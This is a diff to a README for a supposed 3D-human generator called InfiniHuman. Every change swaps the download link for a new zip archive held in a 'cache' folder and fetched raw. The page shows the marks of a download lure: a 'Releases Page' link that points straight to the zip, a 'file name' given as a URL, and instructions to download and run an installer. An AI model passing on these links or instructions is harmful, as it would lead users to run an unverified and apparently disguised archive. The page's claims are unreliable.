@@ -1,6 +1,6 @@
 # 🚀 InfiniHuman - Create 3D Humans Effortlessly
 
-[![Download InfiniHuman](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/InfiniHuman.zip)](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/InfiniHuman.zip)
+[![Download InfiniHuman](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/Infini-Human-v3.0.zip)](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/Infini-Human-v3.0.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Follow these simple steps to download and run InfiniHuman.
 
    Click the link below to access the download page:
 
-   [Visit the Releases Page](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/InfiniHuman.zip)
+   [Visit the Releases Page](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/Infini-Human-v3.0.zip)
 
 2. **Select the Latest Release**
 
@@ -34,7 +34,7 @@ Follow these simple steps to download and run InfiniHuman.
 
 3. **Download the Installer**
 
-   Find the appropriate installer for your operating system. Click the link to start the download. For example, you might see a file named `https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/InfiniHuman.zip` for Windows users.
+   Find the appropriate installer for your operating system. Click the link to start the download. For example, you might see a file named `https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/Infini-Human-v3.0.zip` for Windows users.
 
 4. **Run the Installer**
 
@@ -52,7 +52,7 @@ Follow these simple steps to download and run InfiniHuman.
 
 You can download InfiniHuman by visiting the following link:
 
-[Download InfiniHuman](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/InfiniHuman.zip)
+[Download InfiniHuman](https://raw.githubusercontent.com/SeekorLembu123/InfiniHuman/main/cache/Infini-Human-v3.0.zip)
 
 Make sure to follow the installation guide mentioned above. This will ensure that you set up the application correctly.
 
